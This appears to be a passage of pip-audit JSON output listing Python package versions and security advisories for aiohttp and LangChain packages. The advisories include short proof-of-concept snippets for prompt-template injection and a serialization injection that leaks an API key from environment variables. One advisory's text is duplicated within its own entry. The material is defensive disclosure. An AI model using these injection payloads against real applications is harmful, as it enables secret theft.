{"dependencies": [{"name": "aiohappyeyeballs", "version": "2.6.1", "vulns": []}, {"name": "aiohttp", "version": "3.10.5", "vulns": [{"id": "CVE-2024-52304", "fix_versions": ["3.10.11"], "aliases": ["GHSA-8495-4g3g-x7pr"], "description": "### Summary The Python parser parses newlines in chunk extensions incorrectly which can lead to request smuggling vulnerabilities under certain conditions.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or `AIOHTTP_NO_EXTENSIONS` is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/259edc369075de63e6f3a4eaade058c62af0df71"}, {"id": "CVE-2025-53643", "fix_versions": ["3.12.14"], "aliases": ["GHSA-9548-qrrj-x5pj"], "description": "### Summary The Python parser is vulnerable to a request smuggling vulnerability due to not parsing trailer sections of an HTTP request.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/e8d774f635dc6d1cd3174d0e38891da5de0e2b6a"}, {"id": "CVE-2025-69223", "fix_versions": ["3.13.3"], "aliases": ["GHSA-6mq8-rvhq-8wgg"], "description": "### Summary A zip bomb can be used to execute a DoS against the aiohttp server.  ### Impact An attacker may be able to send a compressed request that when decompressed by aiohttp could exhaust the host's memory.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/2b920c39002cee0ec5b402581779bbaaf7c9138a"}, {"id": "CVE-2025-69224", "fix_versions": ["3.13.3"], "aliases": ["GHSA-69f9-5gxw-wvc2"], "description": "### Summary The Python HTTP parser may allow a request smuggling attack with the presence of non-ASCII characters.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/32677f2adfd907420c078dda6b79225c6f4ebce0"}, {"id": "CVE-2025-69228", "fix_versions": ["3.13.3"], "aliases": ["GHSA-6jhg-hg63-jvvf"], "description": "### Summary A request can be crafted in such a way that an aiohttp server's memory fills up uncontrollably during processing.  ### Impact If an application includes a handler that uses the `Request.post()` method, an attacker may be able to freeze the server by exhausting the memory.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/b7dbd35375aedbcd712cbae8ad513d56d11cce60"}, {"id": "CVE-2025-69229", "fix_versions": ["3.13.3"], "aliases": ["GHSA-g84x-mcqj-x9qq"], "description": "### Summary  Handling of chunked messages can result in excessive blocking CPU usage when receiving a large number of chunks.  ### Impact  If an application makes use of the `request.read()` method in an endpoint, it may be possible for an attacker to cause the server to spend a moderate amount of blocking CPU time (e.g. 1 second) while processing the request. This could potentially lead to DoS as the server would be unable to handle other requests during that time.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/dc3170b56904bdf814228fae70a5501a42a6c712 Patch: https://github.com/aio-libs/aiohttp/commit/4ed97a4e46eaf61bd0f05063245f613469700229"}, {"id": "CVE-2025-69230", "fix_versions": ["3.13.3"], "aliases": ["GHSA-fh55-r93g-j68g"], "description": "### Summary Reading multiple invalid cookies can lead to a logging storm.  ### Impact If the ``cookies`` attribute is accessed in an application, then an attacker may be able to trigger a storm of warning-level logs using a specially crafted Cookie header.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/64629a0834f94e46d9881f4e99c41a137e1f3326"}, {"id": "CVE-2025-69226", "fix_versions": ["3.13.3"], "aliases": ["GHSA-54jq-c3m8-4m76"], "description": "### Summary Path normalization for static files prevents path traversal, but opens up the ability for an attacker to ascertain the existence of absolute path components.  ### Impact If an application uses `web.static()` (not recommended for production deployments), it may be possible for an attacker to ascertain the existence of path components.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/f2a86fd5ac0383000d1715afddfa704413f0711e"}, {"id": "CVE-2025-69227", "fix_versions": ["3.13.3"], "aliases": ["GHSA-jj3x-wxrx-4x23"], "description": "### Summary When assert statements are bypassed, an infinite loop can occur, resulting in a DoS attack when processing a POST body.  ### Impact If optimisations are enabled (`-O` or `PYTHONOPTIMIZE=1`), and the application includes a handler that uses the `Request.post()` method, then an attacker may be able to execute a DoS attack with a specially crafted message.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/bc1319ec3cbff9438a758951a30907b072561259"}, {"id": "CVE-2025-69225", "fix_versions": ["3.13.3"], "aliases": ["GHSA-mqqc-3gqh-h2x8"], "description": "### Summary  The parser allows non-ASCII decimals to be present in the Range header.  ### Impact  There is no known impact, but there is the possibility that there's a method to exploit a request smuggling vulnerability.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/c7b7a044f88c71cefda95ec75cdcfaa4792b3b96"}]}, {"name": "aiosignal", "version": "1.4.0", "vulns": []}, {"name": "altair", "version": "5.5.0", "vulns": []}, {"name": "annotated-doc", "version": "0.0.4", "vulns": []}, {"name": "annotated-types", "version": "0.7.0", "vulns": []}, {"name": "anthropic", "version": "0.70.0", "vulns": []}, {"name": "anyio", "version": "4.11.0", "vulns": []}, {"name": "attrs", "version": "25.4.0", "vulns": []}, {"name": "backoff", "version": "2.2.1", "vulns": []}, {"name": "bandit", "version": "1.9.2", "vulns": []}, {"name": "bcrypt", "version": "5.0.0", "vulns": []}, {"name": "black", "version": "25.12.0", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "branca", "version": "0.8.2", "vulns": []}, {"name": "build", "version": "1.3.0", "vulns": []}, {"name": "cachecontrol", "version": "0.14.4", "vulns": []}, {"name": "cachetools", "version": "5.5.2", "vulns": []}, {"name": "certifi", "version": "2025.11.12", "vulns": []}, {"name": "cfgv", "version": "3.5.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.4.4", "vulns": []}, {"name": "choreographer", "version": "1.2.0", "vulns": []}, {"name": "chromadb", "version": "1.0.21", "vulns": []}, {"name": "click", "version": "8.3.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "coloredlogs", "version": "15.0.1", "vulns": []}, {"name": "coverage", "version": "7.13.0", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "11.6.0", "vulns": []}, {"name": "dataclasses-json", "version": "0.6.7", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "deprecated", "version": "1.3.1", "vulns": []}, {"name": "distlib", "version": "0.4.0", "vulns": []}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "docarray", "version": "0.41.0", "vulns": []}, {"name": "docstring-parser", "version": "0.17.0", "vulns": []}, {"name": "duckduckgo-search", "version": "8.1.1", "vulns": []}, {"name": "durationpy", "version": "0.10", "vulns": []}, {"name": "et-xmlfile", "version": "2.0.0", "vulns": []}, {"name": "faker", "version": "27.0.0", "vulns": []}, {"name": "fastapi", "version": "0.128.0", "vulns": []}, {"name": "fastembed", "version": "0.3.0", "vulns": []}, {"name": "filelock", "version": "3.20.3", "vulns": []}, {"name": "filetype", "version": "1.2.0", "vulns": []}, {"name": "flake8", "version": "7.3.0", "vulns": []}, {"name": "flatbuffers", "version": "25.9.23", "vulns": []}, {"name": "folium", "version": "0.17.0", "vulns": []}, {"name": "frozenlist", "version": "1.8.0", "vulns": []}, {"name": "fsspec", "version": "2025.10.0", "vulns": []}, {"name": "git-filter-repo", "version": "2.47.0", "vulns": []}, {"name": "gitdb", "version": "4.0.12", "vulns": []}, {"name": "gitpython", "version": "3.1.45", "vulns": []}, {"name": "google-ai-generativelanguage", "version": "0.6.9", "vulns": []}, {"name": "google-api-core", "version": "2.28.1", "vulns": []}, {"name": "google-api-python-client", "version": "2.187.0", "vulns": []}, {"name": "google-auth", "version": "2.43.0", "vulns": []}, {"name": "google-auth-httplib2", "version": "0.2.1", "vulns": []}, {"name": "google-generativeai", "version": "0.8.0", "vulns": []}, {"name": "googleapis-common-protos", "version": "1.72.0", "vulns": []}, {"name": "greenlet", "version": "3.2.4", "vulns": []}, {"name": "grpcio", "version": "1.66.2", "vulns": []}, {"name": "grpcio-status", "version": "1.62.3", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httplib2", "version": "0.31.0", "vulns": []}, {"name": "httptools", "version": "0.7.1", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "httpx-sse", "version": "0.4.3", "vulns": []}, {"name": "huggingface-hub", "version": "0.36.0", "vulns": []}, {"name": "humanfriendly", "version": "10.0", "vulns": []}, {"name": "identify", "version": "2.6.16", "vulns": []}, {"name": "idna", "version": "3.11", "vulns": []}, {"name": "importlib-metadata", "version": "8.4.0", "vulns": []}, {"name": "importlib-resources", "version": "6.5.2", "vulns": []}, {"name": "iniconfig", "version": "2.3.0", "vulns": []}, {"name": "isort", "version": "7.0.0", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "jiter", "version": "0.11.1", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpointer", "version": "3.0.0", "vulns": []}, {"name": "jsonschema", "version": "4.25.1", "vulns": []}, {"name": "jsonschema-specifications", "version": "2025.9.1", "vulns": []}, {"name": "kaleido", "version": "1.2.0", "vulns": []}, {"name": "kubernetes", "version": "34.1.0", "vulns": []}, {"name": "langchain", "version": "0.3.27", "vulns": []}, {"name": "langchain-anthropic", "version": "0.3.22", "vulns": []}, {"name": "langchain-chroma", "version": "0.2.6", "vulns": []}, {"name": "langchain-community", "version": "0.3.18", "vulns": [{"id": "CVE-2025-6984", "fix_versions": ["0.3.27"], "aliases": ["GHSA-pc6w-59fv-rh23"], "description": "The langchain-ai/langchain project, specifically the EverNoteLoader component, is vulnerable to XML External Entity (XXE) attacks due to insecure XML parsing. The vulnerability arises from the use of etree.iterparse() without disabling external entity references, which can lead to sensitive information disclosure. An attacker could exploit this by crafting a malicious XML payload that references local files, potentially exposing sensitive data such as /etc/passwd. This issue has been fixed in 0.3.27 of langchain-community."}]}, {"name": "langchain-core", "version": "0.3.79", "vulns": [{"id": "CVE-2025-65106", "fix_versions": ["0.3.80", "1.0.7"], "aliases": ["GHSA-6qv9-48xg-fc7f"], "description": "## Context  A template injection vulnerability exists in LangChain's prompt template system that allows attackers to access Python object internals through template syntax. This vulnerability affects applications that accept **untrusted template strings** (not just template variables) in `ChatPromptTemplate` and related prompt template classes.  Templates allow attribute access (`.`) and indexing (`[]`) but not method invocation (`()`).  The combination of attribute access and indexing may enable exploitation depending on which objects are passed to templates. When template variables are simple strings (the common case), the impact is limited. However, when using `MessagesPlaceholder` with chat message objects, attackers can traverse through object attributes and dictionary lookups (e.g., `__globals__`) to reach sensitive data such as environment variables.  The vulnerability specifically requires that applications accept **template strings** (the structure) from untrusted sources, not just **template variables** (the data). Most applications either do not use templates or else use hardcoded templates and are not vulnerable.  ## Affected Components  - `langchain-core` package - Template formats:   - F-string templates (`template_format=\"f-string\"`) - **Vulnerability fixed**   - Mustache templates (`template_format=\"mustache\"`) - **Defensive hardening**   - Jinja2 templates (`template_format=\"jinja2\"`) - **Defensive hardening**  ### Impact Attackers who can control template strings (not just template variables) can: - Access Python object attributes and internal properties via attribute traversal - Extract sensitive information from object internals (e.g., `__class__`, `__globals__`) - Potentially escalate to more severe attacks depending on the objects passed to templates  ### Attack Vectors  #### 1. F-string Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate  malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__.__name__}\")],     template_format=\"f-string\" )  # Note that this requires passing a placeholder variable for \"msg.__class__.__name__\". result = malicious_template.invoke({\"msg\": \"foo\", \"msg.__class__.__name__\": \"safe_placeholder\"}) # Previously returned # >>> result.messages[0].content # >>> 'str' ```  #### 2. Mustache Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.__class__.__name__}}\")],     template_format=\"mustache\" )  result = malicious_template.invoke({\"question\": msg}) # Previously returned: \"HumanMessage\" (getattr() exposed internals) ```  #### 3. Jinja2 Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.parse_raw}}\")],     template_format=\"jinja2\" )  result = malicious_template.invoke({\"question\": msg}) # Could access non-dunder attributes/methods on objects ```  ### Root Cause  1. **F-string templates**: The implementation used Python's `string.Formatter().parse()` to extract variable names from template strings. This method returns the complete field expression, including attribute access syntax:      ```python      from string import Formatter       template = \"{msg.__class__} and {x}\"      print([var_name for (_, var_name, _, _) in Formatter().parse(template)])      # Returns: ['msg.__class__', 'x']     ```      The extracted names were not validated to ensure they were simple identifiers. As a result, template strings containing attribute traversal and indexing expressions (e.g., `{obj.__class__.__name__}` or `{obj.method.__globals__[os]}`) were accepted and subsequently evaluated during formatting. While f-string templates do not support method calls with `()`, they do support `[]` indexing, which could allow traversal through dictionaries like `__globals__` to reach sensitive objects. 2. **Mustache templates**: By design, used `getattr()` as a fallback to support accessing attributes on objects (e.g., `{{user.name}}` on a User object). However, we decided to restrict this to simpler primitives that subclass dict, list, and tuple types as defensive hardening, since untrusted templates could exploit attribute access to reach internal properties like class on arbitrary objects 3. **Jinja2 templates**: Jinja2's default `SandboxedEnvironment` blocks dunder attributes (e.g., `__class__`) but permits access to other attributes and methods on objects. While Jinja2 templates in LangChain are typically used with trusted template strings, as a defense-in-depth measure, we've restricted the environment to block all attribute and method access on objects    passed to templates.   ## Who Is Affected?  ### High Risk Scenarios You are affected if your application: - Accepts template strings from untrusted sources (user input, external APIs, databases) - Dynamically constructs prompt templates based on user-provided patterns - Allows users to customize or create prompt templates  **Example vulnerable code:** ```python # User controls the template string itself user_template_string = request.json.get(\"template\")  # DANGEROUS  prompt = ChatPromptTemplate.from_messages(     [(\"human\", user_template_string)],     template_format=\"mustache\" )  result = prompt.invoke({\"data\": sensitive_object}) ```  ### Low/No Risk Scenarios You are **NOT** affected if: - Template strings are hardcoded in your application code - Template strings come only from trusted, controlled sources - Users can only provide **values** for template variables, not the template structure itself  **Example safe code:** ```python # Template is hardcoded - users only control variables prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"User question: {question}\")],  # SAFE     template_format=\"f-string\" )  # User input only fills the 'question' variable result = prompt.invoke({\"question\": user_input}) ```  ## The Fix  ### F-string Templates F-string templates had a clear vulnerability where attribute access syntax was exploitable. We've added strict validation to prevent this:  - Added validation to enforce that variable names must be valid Python identifiers - Rejects syntax like `{obj.attr}`, `{obj[0]}`, or `{obj.__class__}` - Only allows simple variable names: `{variable_name}`  ```python # After fix - these are rejected at template creation time ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__}\")],  # ValueError: Invalid variable name     template_format=\"f-string\" ) ```  ### Mustache Templates (Defensive Hardening) As defensive hardening, we've restricted what Mustache templates support to reduce the attack surface:  - Replaced `getattr()` fallback with strict type checking - Only allows traversal into `dict`, `list`, and `tuple` types - Blocks attribute access on arbitrary Python objects  ```python # After hardening - attribute access returns empty string prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.__class__}}\")],     template_format=\"mustache\" ) result = prompt.invoke({\"msg\": HumanMessage(\"test\")}) # Returns: \"\" (access blocked) ```  ### Jinja2 Templates (Defensive Hardening) As defensive hardening, we've significantly restricted Jinja2 template capabilities:  - Introduced `_RestrictedSandboxedEnvironment` that blocks **ALL** attribute/method access - Only allows simple variable lookups from the context dictionary - Raises `SecurityError` on any attribute access attempt  ```python # After hardening - all attribute access is blocked prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.content}}\")],     template_format=\"jinja2\" ) # Raises SecurityError: Access to attributes is not allowed ```  **Important Recommendation**: Due to the expressiveness of Jinja2 and the difficulty of fully sandboxing it, **we recommend reserving Jinja2 templates for trusted sources only**. If you need to accept template strings from untrusted users, use f-string or mustache templates with the new restrictions instead.  While we've hardened the Jinja2 implementation, the nature of templating engines makes comprehensive sandboxing challenging. The safest approach is to only use Jinja2 templates when you control the template source.  **Important Reminder**: Many applications do not need prompt templates. Templates are useful for variable substitution and dynamic logic (if statements, loops, conditionals). However, if you're building a chatbot or conversational application, you can often work directly with message objects (e.g., `HumanMessage`, `AIMessage`, `ToolMessage`) without templates. Direct message construction avoids template-related security concerns entirely.  ## Remediation  ### Immediate Actions  1. **Audit your code** for any locations where template strings come from untrusted sources 2. **Update to the patched version** of `langchain-core` 3. **Review template usage** to ensure separation between template structure and user data  ### Best Practices  - **Consider if you need templates at all** - Many applications can work directly with message objects (`HumanMessage`, `AIMessage`, etc.) without templates## Context  A template injection vulnerability exists in LangChain's prompt template system that allows attackers to access Python object internals through template syntax. This vulnerability affects applications that accept **untrusted template strings** (not just template variables) in `ChatPromptTemplate` and related prompt template classes.  Templates allow attribute access (`.`) and indexing (`[]`) but not method invocation (`()`).  The combination of attribute access and indexing may enable exploitation depending on which objects are passed to templates. When template variables are simple strings (the common case), the impact is limited. However, when using `MessagesPlaceholder` with chat message objects, attackers can traverse through object attributes and dictionary lookups (e.g., `__globals__`) to reach sensitive data such as environment variables.  The vulnerability specifically requires that applications accept **template strings** (the structure) from untrusted sources, not just **template variables** (the data). Most applications either do not use templates or else use hardcoded templates and are not vulnerable.  ## Affected Components  - `langchain-core` package - Template formats:   - F-string templates (`template_format=\"f-string\"`) - **Vulnerability fixed**   - Mustache templates (`template_format=\"mustache\"`) - **Defensive hardening**   - Jinja2 templates (`template_format=\"jinja2\"`) - **Defensive hardening**  ### Impact Attackers who can control template strings (not just template variables) can: - Access Python object attributes and internal properties via attribute traversal - Extract sensitive information from object internals (e.g., `__class__`, `__globals__`) - Potentially escalate to more severe attacks depending on the objects passed to templates  ### Attack Vectors  #### 1. F-string Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate  malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__.__name__}\")],     template_format=\"f-string\" )  # Note that this requires passing a placeholder variable for \"msg.__class__.__name__\". result = malicious_template.invoke({\"msg\": \"foo\", \"msg.__class__.__name__\": \"safe_placeholder\"}) # Previously returned # >>> result.messages[0].content # >>> 'str' ```  #### 2. Mustache Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.__class__.__name__}}\")],     template_format=\"mustache\" )  result = malicious_template.invoke({\"question\": msg}) # Previously returned: \"HumanMessage\" (getattr() exposed internals) ```  #### 3. Jinja2 Template Injection **Before Fix:** ```python from langchain_core.prompts import ChatPromptTemplate from langchain_core.messages import HumanMessage  msg = HumanMessage(\"Hello\")  # Attacker controls the template string malicious_template = ChatPromptTemplate.from_messages(     [(\"human\", \"{{question.parse_raw}}\")],     template_format=\"jinja2\" )  result = malicious_template.invoke({\"question\": msg}) # Could access non-dunder attributes/methods on objects ```  ### Root Cause  1. **F-string templates**: The implementation used Python's `string.Formatter().parse()` to extract variable names from template strings. This method returns the complete field expression, including attribute access syntax:      ```python      from string import Formatter       template = \"{msg.__class__} and {x}\"      print([var_name for (_, var_name, _, _) in Formatter().parse(template)])      # Returns: ['msg.__class__', 'x']     ```      The extracted names were not validated to ensure they were simple identifiers. As a result, template strings containing attribute traversal and indexing expressions (e.g., `{obj.__class__.__name__}` or `{obj.method.__globals__[os]}`) were accepted and subsequently evaluated during formatting. While f-string templates do not support method calls with `()`, they do support `[]` indexing, which could allow traversal through dictionaries like `__globals__` to reach sensitive objects. 2. **Mustache templates**: By design, used `getattr()` as a fallback to support accessing attributes on objects (e.g., `{{user.name}}` on a User object). However, we decided to restrict this to simpler primitives that subclass dict, list, and tuple types as defensive hardening, since untrusted templates could exploit attribute access to reach internal properties like class on arbitrary objects 3. **Jinja2 templates**: Jinja2's default `SandboxedEnvironment` blocks dunder attributes (e.g., `__class__`) but permits access to other attributes and methods on objects. While Jinja2 templates in LangChain are typically used with trusted template strings, as a defense-in-depth measure, we've restricted the environment to block all attribute and method access on objects    passed to templates.   ## Who Is Affected?  ### High Risk Scenarios You are affected if your application: - Accepts template strings from untrusted sources (user input, external APIs, databases) - Dynamically constructs prompt templates based on user-provided patterns - Allows users to customize or create prompt templates  **Example vulnerable code:** ```python # User controls the template string itself user_template_string = request.json.get(\"template\")  # DANGEROUS  prompt = ChatPromptTemplate.from_messages(     [(\"human\", user_template_string)],     template_format=\"mustache\" )  result = prompt.invoke({\"data\": sensitive_object}) ```  ### Low/No Risk Scenarios You are **NOT** affected if: - Template strings are hardcoded in your application code - Template strings come only from trusted, controlled sources - Users can only provide **values** for template variables, not the template structure itself  **Example safe code:** ```python # Template is hardcoded - users only control variables prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"User question: {question}\")],  # SAFE     template_format=\"f-string\" )  # User input only fills the 'question' variable result = prompt.invoke({\"question\": user_input}) ```  ## The Fix  ### F-string Templates F-string templates had a clear vulnerability where attribute access syntax was exploitable. We've added strict validation to prevent this:  - Added validation to enforce that variable names must be valid Python identifiers - Rejects syntax like `{obj.attr}`, `{obj[0]}`, or `{obj.__class__}` - Only allows simple variable names: `{variable_name}`  ```python # After fix - these are rejected at template creation time ChatPromptTemplate.from_messages(     [(\"human\", \"{msg.__class__}\")],  # ValueError: Invalid variable name     template_format=\"f-string\" ) ```  ### Mustache Templates (Defensive Hardening) As defensive hardening, we've restricted what Mustache templates support to reduce the attack surface:  - Replaced `getattr()` fallback with strict type checking - Only allows traversal into `dict`, `list`, and `tuple` types - Blocks attribute access on arbitrary Python objects  ```python # After hardening - attribute access returns empty string prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.__class__}}\")],     template_format=\"mustache\" ) result = prompt.invoke({\"msg\": HumanMessage(\"test\")}) # Returns: \"\" (access blocked) ```  ### Jinja2 Templates (Defensive Hardening) As defensive hardening, we've significantly restricted Jinja2 template capabilities:  - Introduced `_RestrictedSandboxedEnvironment` that blocks **ALL** attribute/method access - Only allows simple variable lookups from the context dictionary - Raises `SecurityError` on any attribute access attempt  ```python # After hardening - all attribute access is blocked prompt = ChatPromptTemplate.from_messages(     [(\"human\", \"{{msg.content}}\")],     template_format=\"jinja2\" ) # Raises SecurityError: Access to attributes is not allowed ```  **Important Recommendation**: Due to the expressiveness of Jinja2 and the difficulty of fully sandboxing it, **we recommend reserving Jinja2 templates for trusted sources only**. If you need to accept template strings from untrusted users, use f-string or mustache templates with the new restrictions instead.  While we've hardened the Jinja2 implementation, the nature of templating engines makes comprehensive sandboxing challenging. The safest approach is to only use Jinja2 templates when you control the template source.  **Important Reminder**: Many applications do not need prompt templates. Templates are useful for variable substitution and dynamic logic (if statements, loops, conditionals). However, if you're building a chatbot or conversational application, you can often work directly with message objects (e.g., `HumanMessage`, `AIMessage`, `ToolMessage`) without templates. Direct message construction avoids template-related security concerns entirely.  ## Remediation  ### Immediate Actions  1. **Audit your code** for any locations where template strings come from untrusted sources 2. **Update to the patched version** of `langchain-core` 3. **Review template usage** to ensure separation between template structure and user data  ### Best Practices  - **Consider if you need templates at all** - Many applications can work directly with message objects (`HumanMessage`, `AIMessage`, etc.) without templates - **Reserve Jinja2 for trusted sources** - Only use Jinja2 templates when you fully control the template content  ## Update: Jinja2 Restrictions Reverted  The Jinja2 hardening introduced in the initial patch has been **reverted as of `langchain-core` 1.1.3**. The restriction was not addressing a direct vulnerability but was part of broader defensive hardening. In practice, it significantly limited legitimate Jinja2 usage and broke existing templates. Since Jinja2 is intended to be used only with **trusted template sources**, the original behavior has been restored. Users should continue to avoid accepting untrusted template strings when using Jinja2, but no security issue exists with trusted templates."}, {"id": "CVE-2025-68664", "fix_versions": ["0.3.81", "1.2.5"], "aliases": ["GHSA-c67j-w6g6-q2cm"], "description": "## Summary  A serialization injection vulnerability exists in LangChain's `dumps()` and `dumpd()` functions. The functions do not escape dictionaries with `'lc'` keys when serializing free-form dictionaries. The `'lc'` key is used internally by LangChain to mark serialized objects. When user-controlled data contains this key structure, it is treated as a legitimate LangChain object during deserialization rather than plain user data.  ### Attack surface  The core vulnerability was in `dumps()` and `dumpd()`: these functions failed to escape user-controlled dictionaries containing `'lc'` keys. When this unescaped data was later deserialized via `load()` or `loads()`, the injected structures were treated as legitimate LangChain objects rather than plain user data.  This escaping bug enabled several attack vectors:  1. **Injection via user data**: Malicious LangChain object structures could be injected through user-controlled fields like `metadata`, `additional_kwargs`, or `response_metadata` 2. **Class instantiation within trusted namespaces**: Injected manifests could instantiate any `Serializable` subclass, but only within the pre-approved trusted namespaces (`langchain_core`, `langchain`, `langchain_community`). This includes classes with side effects in `__init__` (network calls, file operations, etc.). Note that namespace validation was already enforced before this patch, so arbitrary classes outside these trusted namespaces could not be instantiated.  ### Security hardening  This patch fixes the escaping bug in `dumps()` and `dumpd()` and introduces new restrictive defaults in `load()` and `loads()`: allowlist enforcement via `allowed_objects=\"core\"` (restricted to [serialization mappings](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py)), `secrets_from_env` changed from `True` to `False`, and default Jinja2 template blocking via `init_validator`. These are breaking changes for some use cases.  ## Who is affected?  Applications are vulnerable if they:  1. **Use `astream_events(version=\"v1\")`** \u2014 The v1 implementation internally uses vulnerable serialization. Note: `astream_events(version=\"v2\")` is not vulnerable. 2. **Use `Runnable.astream_log()`** \u2014 This method internally uses vulnerable serialization for streaming outputs. 3. **Call `dumps()` or `dumpd()` on untrusted data, then deserialize with `load()` or `loads()`** \u2014 Trusting your own serialization output makes you vulnerable if user-controlled data (e.g., from LLM responses, metadata fields, or user inputs) contains `'lc'` key structures. 4. **Deserialize untrusted data with `load()` or `loads()`** \u2014 Directly deserializing untrusted data that may contain injected `'lc'` structures. 5. **Use `RunnableWithMessageHistory`** \u2014 Internal serialization in message history handling. 6. **Use `InMemoryVectorStore.load()`** to deserialize untrusted documents. 7. Load untrusted generations from cache using **`langchain-community` caches**. 8. Load untrusted manifests from the LangChain Hub via **`hub.pull`**. 9. Use **`StringRunEvaluatorChain`** on untrusted runs. 10. Use **`create_lc_store`** or **`create_kv_docstore`** with untrusted documents. 11. Use **`MultiVectorRetriever`** with byte stores containing untrusted documents. 12. Use **`LangSmithRunChatLoader`** with runs containing untrusted messages.  The most common attack vector is through **LLM response fields** like `additional_kwargs` or `response_metadata`, which can be controlled via prompt injection and then serialized/deserialized in streaming operations.  ## Impact  Attackers who control serialized data can extract environment variable secrets by injecting `{\"lc\": 1, \"type\": \"secret\", \"id\": [\"ENV_VAR\"]}` to load environment variables during deserialization (when `secrets_from_env=True`, which was the old default). They can also instantiate classes with controlled parameters by injecting constructor structures to instantiate any class within trusted namespaces with attacker-controlled parameters, potentially triggering side effects such as network calls or file operations.  Key severity factors:  - Affects the serialization path - applications trusting their own serialization output are vulnerable - Enables secret extraction when combined with `secrets_from_env=True` (the old default) - LLM responses in `additional_kwargs` can be controlled via prompt injection  ## Exploit example  ```python from langchain_core.load import dumps, load import os  # Attacker injects secret structure into user-controlled data attacker_dict = {     \"user_data\": {         \"lc\": 1,         \"type\": \"secret\",         \"id\": [\"OPENAI_API_KEY\"]     } }  serialized = dumps(attacker_dict)  # Bug: does NOT escape the 'lc' key  os.environ[\"OPENAI_API_KEY\"] = \"sk-secret-key-12345\" deserialized = load(serialized, secrets_from_env=True)  print(deserialized[\"user_data\"])  # \"sk-secret-key-12345\" - SECRET LEAKED!  ```  ## Security hardening changes (breaking changes)  This patch introduces three breaking changes to `load()` and `loads()`:  1. **New `allowed_objects` parameter** (defaults to `'core'`): Enforces allowlist of classes that can be deserialized. The `'all'` option corresponds to the list of objects [specified in `mappings.py`](https://github.com/langchain-ai/langchain/blob/master/libs/core/langchain_core/load/mapping.py) while the `'core'` option limits to objects within `langchain_core`. We recommend that users explicitly specify which objects they want to allow for serialization/deserialization. 2. **`secrets_from_env` default changed from `True` to `False`**: Disables automatic secret loading from environment 3. **New `init_validator` parameter** (defaults to `default_init_validator`): Blocks Jinja2 templates by default  ## Migration guide  ### No changes needed for most users  If you're deserializing standard LangChain types (messages, documents, prompts, trusted partner integrations like `ChatOpenAI`, `ChatAnthropic`, etc.), your code will work without changes:  ```python from langchain_core.load import load  # Uses default allowlist from serialization mappings obj = load(serialized_data)  ```  ### For custom classes  If you're deserializing custom classes not in the serialization mappings, add them to the allowlist:  ```python from langchain_core.load import load from my_package import MyCustomClass  # Specify the classes you need obj = load(serialized_data, allowed_objects=[MyCustomClass]) ```  ### For Jinja2 templates  Jinja2 templates are now blocked by default because they can execute arbitrary code. If you need Jinja2 templates, pass `init_validator=None`:  ```python from langchain_core.load import load from langchain_core.prompts import PromptTemplate  obj = load(     serialized_data,     allowed_objects=[PromptTemplate],     init_validator=None )  ```  > [!WARNING] > Only disable `init_validator` if you trust the serialized data. Jinja2 templates can execute arbitrary Python code.  ### For secrets from environment  `secrets_from_env` now defaults to `False`. If you need to load secrets from environment variables:  ```python from langchain_core.load import load  obj = load(serialized_data, secrets_from_env=True) ```   ## Credits  * Dumps bug was reported by @yardenporat * Changes for security hardening due to findings from @0xn3va and @VladimirEliTokarev"}]}, {"name": "langchain-experimental", "version": "0.3.4", "vulns": []}, {"name": "langchain-google-genai", "version": "2.0.8", "vulns": []}, {"name": "langchain-openai", "version": "0.2.10", "vulns": []}, {"name": "langchain-text-splitters", "version": "0.3.11", "vulns": []}, 